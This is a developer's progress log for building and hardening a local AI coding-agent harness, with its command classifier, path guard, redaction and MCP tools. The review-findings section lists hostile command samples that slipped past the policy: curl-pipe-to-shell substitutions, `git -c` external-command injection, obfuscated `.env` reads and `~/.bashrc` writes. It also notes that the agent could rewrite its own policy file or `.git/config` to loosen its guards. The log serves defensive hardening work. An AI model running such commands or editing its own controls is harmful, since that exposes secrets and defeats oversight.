# Progress log

## 2026-10-22 (night): M2 complete (steps 0 to 9)

- Step 9: end-to-end with Qwen3.5-9B through OpenCode on Windows. The model used `symbol_search` and
  `find_references`, fixed `calc.py` (`add` subtracted), and ran `run_tests` with targets (`test_calc.py`), which
  the policy allowed. The event log has no secret values. Details: [milestones/m2-tools.md](milestones/m2-tools.md).
- Two errors in the first run were my own config and naming mistakes (`targets = false`, a non-existent step name).
  The tool messages named the fix and the model recovered.

## 2026-10-22 (end of day): M2 steps 7 and 8 done

- Step 7: `inspect_artifact` (JSON shape, JSONL and CSV statistics, text tail), `summarize_experiment` (files,
  redacted config, final metrics), `compare_experiments` (metric deltas, config keys that differ).
- Step 8: declarative adapters. `[[tools.adapters]]` (machine or `--config` only: a repository may not add tools,
  enforced in `config::trust`) become `adapter_<name>` tools. They run through the same `execute_plain` path as
  `run_command`, so they get the same classification, secret and path checks. Validation V25 checks names,
  bare program names, plain arguments and descriptions.

## 2026-10-22 (later still): M2 step 6 done (dependency_search)

- `dependency_search`: declared dependencies from Cargo.toml (all sections and the workspace table),
  pyproject.toml (PEP 621 and Poetry), requirements*.txt and package.json, matched case and -/_ insensitively.
  With a name, it also lists the source imports of that package (Rust `use`, Python `import`/`from`).
  Manifests and sources pass the read policy; sources are capped at 2000 per call.
- Not yet: CMake `find_package` and Go/Gradle manifests.
- Gate green on Windows.

## 2026-10-22 (later): M2 step 5 done (tree-sitter code tools, ADR-0003)

- ADR-0003: tree-sitter 0.27.1 with the Rust, Python and C++ grammars (exact pins, MIT). Syntactic only.
- `crate::code`: pure parsing (definitions, identifier occurrences outside comments and strings, imports).
- MCP tools: `repo_map`, `file_summary`, `symbol_search`, `find_references`. Only tracked files that pass the
  read policy are parsed; files over 512 KB and binaries are skipped; at most 2000 parsed per call.
- Build: the offline vendor set is now `D:\cargo-vendor\harness-new` (`cargo vendor` run 2026-10-22); the old
  `harness` directory is kept for rollback. The build scripts point at `harness-new`.
- Gate green on Windows (492 tests across the workspace).

## 2026-10-22 (late): M2 step 4 done (run_command, inspect_config)

- `run_command`: one program on PATH, plain words only (no shell syntax), workspace cwd, timeout capped at 10 min. The whole command goes through the full policy (secret and path checks, command class) before it runs; blocked calls return `status: blocked` with the rule. `git --version` is blocked as an unrecognised git form (fail closed); `git status --short` runs.
- `inspect_config`: effective config (redacted) and validation findings.
- Gate green on Windows.

## 2026-10-22 (night): M2 started, steps 0 to 3 done

Branch `m2-tools` in `D:\src\harnessforkush`; plan in [milestones/m2-tools.md](milestones/m2-tools.md).
Windows gate green after each step.
- Step 0 (`6ddda6c`): `mcp/tools.rs` became `mcp/tools/mod.rs`; new tool groups are child modules; git test
  helpers in `tools/test_support.rs`.
- Step 1 (`6ddda6c`): `git_history` (follows renames for a file) and `git_log_range` (commits, changed files,
  totals). Revisions must be plain and resolve to a commit; `--end-of-options` before them. A harness tool
  given a secret path is now denied at the hook too.
- Step 2 (`4b5d484`): steps have a `kind` (test, lint, typecheck, build, other; default test) and `targets`.
  `run_tests`, `run_linter`, `run_typechecker` run steps of their kind; `run_tests` appends checked targets
  to steps with `targets = true`. V24 warns about targets on a non-test step.
- Step 3: `harness_core::failures` parses pytest, unittest, Python tracebacks, cargo test, rustc, gtest,
  ctest, go test, GCC/Clang, MSVC, tsc, mypy, pyright and ruff/flake8 output into failures (tool, kind, name,
  file, line, column, message). Failed steps carry them, and `parse_test_failure` parses output the model
  already has (AC-A5). A real failing pytest run on Windows returns `test_calc.py::test_add at test_calc.py:6`.

Next (step 4): `run_command`, `inspect_config`. Then tree-sitter tools (ADR-0003 first), dependency search,
artifacts, adapters, the end-to-end run, and the `m2` tag.

## 2026-10-22 (evening): M1 end-to-end on Windows, all exit criteria met

End-to-end on native Windows with the current build (`35fd79d`), Qwen3.5-9B on the RTX 4060, OpenCode 1.19.3,
toy repo `D:\e2e\toy` regenerated with `agent init --force` (logs in `D:\e2e\logs\`):
- `agent models serve main --detach`: healthy in 9.6 s. It found yesterday's PID record, saw that the process was
  gone, and cleared it (the new identity check on real data). Quick health: pass.
- Fix task: the model read the files, edited `calc.py` (`a - b` to `a + b`), tried `python test_calc.py`
  (blocked: EXECUTE_RISKY, running a repo script), then ran `pytest test_calc.py -v`: 2 passed.
  `python -m unittest -q` afterwards: OK.
- `local-agent_git_diff` through OpenCode for the first time: correct one-line summary of the fix.
- `local-agent_git_status`: branch and uncommitted changes reported from the tool output.
- Secret read: `read .env` denied by `secret_file`; the model said it cannot read it.
- `local-agent_run_verification` through OpenCode for the first time: "unit tests" passed (under the derived
  MCP timeout).
- `agent models stop main`: verified the process image, then stopped it.
- The planted secret value occurs 0 times in `tool-events.jsonl`, `events.jsonl`, the server log and every run
  output.

M1 exit criteria (plan section 4):
1. No `todo!(` in the crates: 0.
2. fmt, clippy `-D warnings`, tests: pass on native Windows (`wgate.bat`). WSL is release 2 (user decision:
   postpone WSL use), so the WSL gate is not run for M1.
3. Hook fixtures: 34 payloads pass on Windows; Ask is never allowed; secret reads denied through every prefix.
4. `doctor`: missing model file, models directory on the system drive, busy or reserved port; no panic.
5. Launcher argv snapshots: no `--no-mmap`, `--load-mode`, `-np 1`, explicit `--cache-ram`, no spec flags.
6. The generated config loads in OpenCode 1.19.3; the plugin loads; tool calls reach the policy (event log).
7. `tsc --noEmit`: last run 2026-10-21 against `@opencode-ai/plugin` 1.19.3. Not re-run today (no Node on the
   Windows host); the only shim change since is one string literal of the same union type, and OpenCode loaded
   the shim in today's runs.
8. Traceability matrix updated with evidence.
9. Real Qwen run on Windows: done (above).

## 2026-10-22 (afternoon): work moved to Windows; review fixes merged

Where the work happens now (user decision: postpone WSL use; no subagents):
- The working repository is `D:\src\harnessforkush`, cloned from the WSL repo with Windows git. Every branch
  came across, including the subagents' saved work. Builds and tests run on Windows only:
  `D:\cargo-target\wgate.bat` (fmt, clippy `-D warnings`, tests), `wcargo.bat <args>`, `wgit.bat <args>`,
  4 build jobs, vendored crates, target dir `D:\cargo-target\harness`. The WSL repo is behind; fetch from
  `D:` before using it again.
- Why: three session restarts while four or five agents were building in WSL. WSL kept about 8 GB as
  file cache, and Windows (15.7 GB) fell to 0.6 GB free. WSL logged no out-of-memory kills and its VM did not
  reboot. `.wslconfig` now sets `memory=8GB` and `autoMemoryReclaim=dropCache` (backup `.wslconfig.bak-2026-10-22`).
  It applies after `wsl --shutdown`.

Merged and verified on Windows (fmt, clippy and all 11 test suites pass, `fbbce01`):
- Redaction fixes (`9bb3eb0`), path policy fixes including protected control files (`457f099`), MCP fixes
  including the review follow-ups (`25bd530`), classifier fixes (`12bc114`).
- Windows found three problems that Linux tests missed. Lesson: run the Windows gate before merging.
  - A test used an 8.3 short temp path (`KUSHAG~1`) as its base; the guard correctly refuses it (test fixed).
  - **The classifier lexed Windows commands as `cmd`, but OpenCode 1.19.3 runs them in PowerShell.** Its
    `Shell.preferred` uses `SHELL`, or else the first of pwsh, powershell, Git Bash, cmd (read from the
    binary), as `powershell -NoProfile -Command <cmd>`. The same text differs between the grammars: a
    single-quoted `&` is literal in PowerShell and splits commands in cmd. `ShellKind::host_default` now
    follows the host's rule. Verification steps run under `cmd /C`, so they are classified as cmd (`assess_in`).
  - A `$(printf '\056env')` substitution is denied by the path guard first on Windows (rooted `\056env`); still denied.
- `git config` writes were already EXECUTE_RISKY on the classifier branch (only `--get`, `--get-all` and
  `--list` are read-only), so the extra item needs no code; read forms such as `--get-regexp` stay blocked.

Then fixed in the main session, each with tests, Windows gate green after each (`a8fe97d`):
- `ab3005b` repository-config trust (`config/trust.rs`); V22 reserved `extra_args` flags, also refused by the
  launcher; V23 timeout and retry bounds; 1 MiB SSE line cap. The toy repo's `safe_commands` entry was removed
  (`python -m unittest` is built in; a repository may no longer set safe prefixes).
- `67609f0` `models stop` checks the PID's executable before signalling (records hold `pid=` and `bin=`;
  PIDs outside `1..=i32::MAX` refused); `--version` bounded at 5 s; `doctor` reports a busy or reserved port
  (M1 exit item 4).
- `ec77ac7` MCP timeout derived from the verification step timeouts; unanswered `permission` is `deny` (Rust and
  shim; `tsc` not run, no Node on Windows).
- `a8fe97d` event-log top-level text redacted, with file read-back tests; `init` minors.
- Deferred to release 2: a process group for launched servers on Unix.
- Found: a machine config written by a process the desktop app started lands in the app's MSIX
  storage (`%LOCALAPPDATA%\Packages\<app>_<id>\LocalCache\Roaming\local-agent\config.toml`), not in
  `%APPDATA%`. Programs started outside the app do not see it. Documented in cli-commands.md.

Docs (`32d8d97`): module pages for security and MCP written; the other five pages, `security.md` and
`configuration.md` updated to the fixed behaviour.

Still open for M1: rebuild `agent.exe` and rerun the Windows end-to-end runs (edit-and-test, secret read, MCP
`git_status`, plus `git_diff` and `run_verification` through OpenCode for the first time); traceability
matrix; merge into `main` and tag `m1`. The WSL repo must fetch from `D:` before it is used again.

## M1 closing checklist (2026-10-22, morning)

Done today: process-tree kill on verification timeout (`4f52dc4`); server-side MCP redaction (`6fb64b0`);
safe prefixes only upgrade risky commands (`dc61a5a`); doctor warns on a missing models directory (`e4242df`);
security residual risks updated (`2be261d`). `doctor` with missing models and runtimes: runtimes block, models
warn, no panic, exit 1 (checked by hand).

Remaining to close M1, in order:
1. Collect the four read-only code reviews (policy/classifier, redaction/logging, MCP, providers/launcher/init/models)
   started on 2026-10-22; fix every blocker and major finding, each with a test.
2. Full workspace tests on WSL, then the Windows gate (`D:\cargo-target\run-wintest.bat`, vendored crates) on the final head.
3. Rebuild the Windows `agent.exe` (`D:\cargo-target\run-build-agent.bat`) and rerun the scripted end-to-end runs in
   `D:\e2e\toy`: the edit-and-test fix (`run-e2e.bat`), the secret read (`run-sec.bat`), and MCP `git_status` (`run-mcp.bat`).
   Reset `calc.py` to the buggy version first (`git checkout calc.py`). Start the model with `agent models serve main --detach`.
4. Update this log and the traceability matrix, then merge `m1-basic-integration` into `main` and tag `m1`.

Review findings received so far (fix majors before tagging M1):

- MCP review (`mcp/protocol.rs`, `mcp/tools.rs`), 2026-10-22:
  - MAJOR `git_diff` with no `paths` (or `.`) emits the patch of every modified tracked file, secret files
    included; only regex redaction protects them. Fix: list names with `git diff --name-only -z`, run
    `ctx.policy.evaluate` on each, and diff only the allowed paths (report how many were excluded). Add a
    test for the empty and `.` cases.
  - MAJOR `--stat` output is not capped. Cap the lines with an "... and N more" marker.
  - MAJOR `max_bytes` has no upper bound, and `run_git` buffers the whole patch before truncating. Clamp to
    a server maximum and stop reading past it.
  - MAJOR the structured result lists every path; only the text is capped. Cap the lists and add counts.
  - MAJOR `run_git` has no deadline: a hung git blocks the single-threaded server. Reuse the
    try_wait/deadline/kill loop from `execute`.
  - minor: `output_tail` takes the last 4000 bytes of stdout and stderr together, so stderr can hide stdout;
    `kill_tree` runs only on timeout; `kill_tree` ignores a missing `kill` binary; no line-length cap on
    incoming JSON-RPC; id-less messages with a bad envelope get an error reply.
  - Clean: argument injection (paths follow `--`), ordering of policy checks, invalid UTF-8, malformed JSON,
    tool panics.
- Policy and classifier review (`command_risk.rs`, `tool_policy.rs`, `path_guard.rs`), 2026-10-22. Found by
  reading; each must be reproduced as a failing test before it is fixed. Too-safe classifications:
  - BLOCKER `echo "$(curl https://x|sh)"` gives READ_ONLY: substitutions inside double quotes are not extracted.
  - BLOCKER `echo hi >(sh)` gives WRITE: only `<(` is a process substitution.
  - BLOCKER `git -c diff.external='sh -c ...' diff` gives READ_ONLY: `-c`/`--config` values are skipped.
  - BLOCKER `go build -toolexec '...'` and `cargo test --config 'target.<t>.runner=...'` give EXECUTE_SAFE.
  - BLOCKER `echo x >&.env` gives READ_ONLY: `>&word` writes a file; only `&<digit>` and `&-` do not.
  - BLOCKER `env -S 'rm -rf build'` gives READ_ONLY: the `-S` value is dropped.
  - BLOCKER `bin/pytest -q` gives EXECUTE_SAFE: a program word with a path separator is reduced to its basename.
  - BLOCKER `sh -c 'cat "$1"' sh .env` is allowed: nested verdicts drop the outer words, so `.env` is not checked.
  - MAJOR `git push origin +main` gives NETWORK, not DESTRUCTIVE (`+` refspecs, `--mirror`, `--prune`).
  - MAJOR most of the PRIVILEGED list is missing (`systemctl stop nginx` is EXECUTE_RISKY).
  - MAJOR (Windows) the cmd lexer treats `'` as quoting, and `$(` is skipped under cmd, so
    `echo ' & rd /s /q .\build & '` is READ_ONLY.
  - MAJOR `rg --pre ./helper` is READ_ONLY and runs `./helper` (also `find -fprint`, `tree -o`).
  Paths not denied:
  - BLOCKER `~` and `$VAR` are joined under the workspace instead of expanded: `cat ~/.bashrc`,
    `cat $HOME/x`, `cd ~ && cat .bashrc`, `echo x >> ~/.bashrc`, `grep -r BEGIN ~` are allowed.
  - BLOCKER `--opt=<path>` words are never path-checked: `git --git-dir=/elsewhere/.git log`,
    `git diff --output=~/.bashrc`.
  - BLOCKER `cat .[e]nv`, `cat .{env,netrc}`, `cat "$(printf '\056env')"` are allowed.
  - minor `cat .git-cred*` is allowed: the glob samples are narrower than `is_secret_file`.
  - Clean: panics.
- Redaction and logging review (`redact.rs`, `event_log.rs`, hooks), 2026-10-22:
  - MAJOR escaped quotes break assignment redaction: `password=\"hunter2\"` keeps `hunter2`;
    `{\"api_key\":\"hunter2\"}` is unchanged.
  - MAJOR `ENCRYPTION_KEY=...`, `PASSPHRASE=...`, `sessionid=...` are not redacted, and `shell_env` does not blank them.
  - MAJOR `curl -u admin:hunter2` and `--token hunter2` are not redacted (event log and model output).
  - minor: a value starting with a delimiter; a value after `[REDACTED]`; `@` inside a URL password;
    `ACCESS_TOKENS=` exempted as a count; tool_before `message` (unrecognised program name) and the MCP
    `unknown tool` error are not redacted; `config validate` prints messages unredacted.
  - Clean: panics, idempotence (by reading).
- Providers, launcher, init and models review, 2026-10-22:
  - MAJOR `launch.extra_args` can add `--host 0.0.0.0` after the loopback check; no validation of reserved flags.
  - MAJOR a repository `local-agent.toml` is merged over the machine config, so a cloned repo can choose
    the server binary (`runtimes.*.server_bin`), which `models serve` and `models manifest` run.
  - MAJOR `models stop` signals the PID in the pid file with no identity check (PID reuse after a crash or reboot).
  - MAJOR `read_pid` accepts 0 and values that wrap to -1 (`kill 0`, `kill -1`).
  - minor: the launcher does not start a process group on Unix; Windows `process_exists` is always false;
    `<bin> --version` has no timeout; no SSE line cap; `timeout_ms` and `retries` unbounded; init overwrites
    an unreadable machine config; init skips the ledger save if the shim write fails.
  - Clean: API key handling, argv separation, panics.
- Found while writing the module docs (2026-10-22):
  - GAP (M1 exit item 4): `doctor` has no busy-port check.
  - `failure_answer` and the shim answer `ask` for `permission` when the harness cannot answer; `deny` matches D3.
    Tool calls are still blocked by `tool-before`, so this is consistency, not a hole.
  - No unit test writes an event containing a secret and checks the log file (verified only end to end).
  - BUG: the generated MCP entry has `timeout: 10000`, and OpenCode 1.19.3 applies it to every MCP request
    ("Timeout in ms for MCP server requests", from the binary). Verification steps default to 600 s, so a test
    suite longer than 10 s fails through OpenCode. Fix: derive the timeout from the verification step timeouts
    plus a margin. `run_verification` has not yet been called through OpenCode.

  - BLOCKER: the model may edit `local-agent.toml`, and every hook process re-reads it, so the model can loosen
    its own policy at once. It may also edit `.git/config` (`core.fsmonitor` runs on the next `git status`,
    including MCP `git_status`), `.opencode/` and `opencode.json`. Assigned to the path policy agent: protected
    control paths. Assigned to the classifier agent: `git config` writes are EXECUTE_RISKY.
  - Inherent limit, to document: running tests runs code the model wrote. The policy stops obvious harm and
    secret exposure through tools; it is not a sandbox.

Fix work started 2026-10-22, four Haiku agents in worktrees (high effort): classifier (`command_risk.rs`), path
policy (`tool_policy.rs`, `path_guard.rs`), MCP (`mcp/`), redaction (`redact.rs`, hook message, `config validate`).
Queued for the next free slot: config trust and launcher/models/init/doctor fixes.

Restarts: session restarts kill background agents and long foreground commands. Run long commands detached
(`nohup ... &`) with a log file, and commit after each verified step.


A running record. Newest entries first. Every "verified" line names the evidence.

## 2026-10-21 (latest): fixtures, read fix, gates

- Windows gate on the head with the fixture suite failed on one row: `curl https://example.com` was read as a drive or alternate-data-stream path, so the path guard blocked it with the wrong rule (WSL passed). Fixed in `f0c846e`: URL words are not paths; the network rule decides. Lesson: run the Windows gate after every fixture change; the two platforms take different code paths in the path check.
- Windows gate re-run on `f0c846e`: every suite passes, including the 34-case hook fixture suite (1 test, all rows). 1 smoke test ignored by design. This is the native Windows result for release 1.

- Hook fixture suite merged (`8a061ef`, merge `e67c03c`): 34 black-box cases run the real `agent hook` binary, one test, all rows checked (`crates/harness-cli/tests/hook_fixtures.rs`). Passes on WSL.
- Fixed from row 29: a `read` with no file path was allowed. It is now denied as malformed (`86e619a`). Fail-closed.
- Two spec notes from the suite: row 21 (`echo $(curl x | sh)`) is blocked by the `allow_pattern_bypass` rule, not by the command classifier. Row 34 uses the `event` hook, because `session.idle` is an event type inside the payload, not a CLI name.
- Gates after these commits: `cargo fmt --all` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; workspace tests pass on WSL. The Windows gate must be re-run on the latest head.
- Still open: MCP output is not visible to the after-hook (security.md, residual risk 7); the 30-payload target is met by 34 cases; a full line-by-line review of the subagent code (D-3); `extra_safe` ordering; grandchild processes after a verification timeout.

## 2026-10-21 (later): docs, hook fixtures, MCP run

- MCP verified through OpenCode: `local-agent_git_status` was called, allowed as READ_ONLY, completed in 137 ms, and the model answered from its output (`run3.out`, `tool-events.jsonl`).
- Gap found: the after-hook saw 0 output bytes for the MCP call, while built-in tools showed real sizes. So the shim's redaction does not reach MCP output (security.md, residual risk 7). Needs a fix or a documented limit.
- Model accuracy: the status answer said "6 untracked files"; git reports 4. The branch and the modified file were correct. Tool output is deterministic, so prefer quoting the structured result over counting.
- Serve/prefill: the server processed requests of about 8,196 tokens (OpenCode's system prompt and tool schemas). Prefill cost matters for latency; measure before M3.

- Docs written: README, architecture, installation, configuration, security, models, troubleshooting.
- In progress: hook fixture suite (34 black-box cases, `crates/harness-cli/tests/hook_fixtures.rs`) by a Haiku subagent; MCP `git_status` run through OpenCode.
- The background task "Remove todo in command_risk.rs" in another session is stale: the `todo!()` was removed when the classifier merged. Stop it.
- Found: the Qwen server did not answer health probes while its one slot was generating. A long single generation (about 2,800 tokens) was in progress during the MCP run. Investigate reasoning length.

## 2026-10-21: end-to-end on Windows

Verified (evidence in `D:\e2e\`):

- OpenCode 1.19.3 loads the shim plugin from `.opencode/plugins/` (only with the proxy variables cleared).
- A headless run fixed the toy repo's bug: `add()` now adds, and `python -m unittest -q` reports 2 passed. Every tool call went through the hook and was logged (`run1.out`, `tool-events.jsonl`).
- A read of a planted secret `.env` was denied by the `secret_file` rule; the model said so. The secret value is absent from the event log and the run output (`run2.out`).
- The full health check passes in 2.5 s: streaming (98 ms to first token), tool call, structured output, context 16384 (`agent health main`).
- Quick health, serve and stop work through the harness with the proxy fix.

Fixed on the way (each has a regression test):
- Loopback HTTP clients ignored the environment proxy (`http.rs`).
- Speculative decoding detected as active for `"none"` (`health.rs`).
- Windows commands were lexed as POSIX, breaking `D:\...` paths (`command_risk.rs`, `host_default`).
- Shell arguments were not checked against secret files or the workspace (`tool_policy.rs`).
- Ask verdicts were allowed (`opencode_v1.rs`, decision D3).
- The launcher emitted `--no-mmap`, which b11756 lacks (`launcher.rs`).
- The default prompt cache (8 GB) would have starved the 16 GB host (profiles).

Gates at this point: `cargo test --workspace` passes on WSL and on native Windows; `cargo clippy --workspace --all-targets -- -D warnings` passes; `cargo fmt --check` passes; `rg 'todo!('` finds nothing; `npm run typecheck` in `opencode-plugin/` passes against `@opencode-ai/plugin` 1.19.3.

Known gaps:
- Hook payloads: 6 checked by hand, plus the runs. The 34-case suite is in progress.
- MCP tools: unit-tested; not yet called through OpenCode (MCP run in progress).
- `doctor` with a missing model: not separately tested.
- Verification timeouts leave grandchild processes running.
- `extra_safe` can downgrade a WRITE command (policy review needed).
- Recursive `grep` over the repo can print secret values into context; output redaction untested for this case.
- The subagent code was checked by gates and targeted tests, not read line by line. A full review pass is still owed (decision D-3).

## 2026-10-21: merges and decisions

- Merged the reviewed subagent branches: redactor (`e6359cb`), launcher argv (`a433689`), config profiles and validation (`c53f09b`), TypeScript shim (`919052c`), providers (`e413970`), MCP server (`b8df47a`), doctor/health/models (`700f142`), command classifier (`505ffd5`).
- Decision: release 1 is Windows-only; WSL moves to release 2 (ADR-0002 amendment).
- Decision: classifier default on Windows is the `cmd` lexer (`ShellKind::host_default`).
- Decision: profiles set an explicit load mode, one parallel slot and a 1 GiB prompt cache for the main model.

## 2026-10-21: Wave 0 and the POC

- uv cache removed (23 GB, approved); repo backed up with `git bundle` (verified); worktrees checked; uncommitted subagent work saved as patches.
- Windows build baseline: builds with MSVC in about 34 s. Offline build via vendored crates (cargo on Windows follows the git-config proxy).
- P1 (Windows POC) passed: Qwen healthy in 11 s, `READY`, correct tool call, VRAM 5.4 of 8.2 GB, host free RAM 382 MB while serving.

## 2026-10-21: planning

- Four read-only audits (core, OpenCode host, inference runtime, delivery) and an Opus review of the plan. Plan approved after the review and the decisions in its section 9.
- Plan and decisions are in `plans/make-a-plan-first-humble-robin.md` in the user's home folder (outside the repo).

## 2026-10-21: baseline

- Brief saved verbatim (`docs/spec/master-development-plan.md`). Requirements matrix with directives D-1 to D-5 (`docs/spec/requirements-traceability.md`). M0 audit (`docs/audit/`). ADR-0001 (Rust core, thin shim). Git repo initialised on branch `m1-basic-integration`.
